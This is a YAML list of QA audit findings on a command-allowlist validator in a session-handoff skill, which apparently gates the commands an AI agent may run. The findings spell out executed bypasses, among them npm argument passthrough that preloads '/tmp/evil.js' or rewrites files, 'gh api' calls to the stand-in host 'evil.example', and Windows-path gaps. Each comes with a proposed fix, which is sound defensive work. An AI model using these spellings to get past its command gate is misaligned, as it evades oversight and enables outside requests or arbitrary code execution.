top_issues:
  - id: 'QA-1'
    severity: high
    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
    finding: 'npmRule forwards everything after -- unchecked (any dash token; POS.ANY positionals): npm run format:check -- --write runs prettier --check . --write and rewrote every file in the fixture tree (executed); npm test -- -r /tmp/evil.js reaches node --test -r /tmp/evil.js and preloaded the file (executed) — the node --test x/ -r pre.js shape the contract lists as refused, through the arm that does not look at its arguments.'
    suggested_action: 'Drop the -- passthrough for non-test scripts; hold npm test -- … to NODE_FLAGS/NODE_FLAG_PATTERN and POS.PATHS; add the write and the five absolute-value spellings (plus the quoted form) to the refused-list test.'
    suggested_owner: dev
    bug_ref: 'task.110.bug.6.npm-passthrough-admits-writes-and-outside-modules.md'
    status: open
  - id: 'QA-2'
    severity: medium
    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
    finding: 'ghRule checks the api endpoint with POS.PATHS + allowAbsolute (refuses only ..), so gh api https://evil.example/x is allowed and gh requests the URL as-is — a local listener received GET /probe-path from GitHub CLI 2.94.0 with no Authorization header (executed): egress to any host through the spelling --hostname was refused for.'
    suggested_action: 'Refuse :// in the endpoint (or anchor it to ^[A-Za-z0-9_./-]+$); add gh api https://evil.example/x to the refused-list test.'
    suggested_owner: dev
    bug_ref: 'task.110.bug.7.gh-api-accepts-absolute-url.md'
    status: open
  - id: 'QA-3'
    severity: low
    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
    finding: 'npm run eval:<x>:cli and :sdk are admitted by the eval:* regex; both set DRIVER=claude-* and shell out to claude -p — a live, billed agent run the repo documents as opt-in (reasoned, not executed).'
    suggested_action: 'Exclude the :cli/:sdk suffixes from the eval:* admission.'
    suggested_owner: dev
    status: open
  - id: 'QA-4'
    severity: low
    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
    finding: 'Windows drive-letter absolute paths (C:/tmp/evil.js, C:\tmp\evil.js) pass valueOk and isSafePositional, although the design already refuses //host as UNC for Windows (reasoned; harmless on POSIX).'
    suggested_action: 'Treat /^[A-Za-z]:[\/]/ as absolute beside the leading-slash rule.'
    suggested_owner: dev
    status: open
  - id: 'QA-5'
    severity: low
    file: 'skills/session-handoff/tests/handoff-verify.test.js'
    finding: 'The per-spec patternFlags mechanism the cycle-5 fix introduced has no committed test: deleting patternFlags from GIT_SPECS.log and .show leaves 28/28 green (mutant no-red-untested; reviewer CR-1 independently).'
    suggested_action: 'Assert git log --format=/%H and git show --pretty=/x HEAD are allowed, so removing the opt-in turns a test red.'
    suggested_owner: dev
    status: open

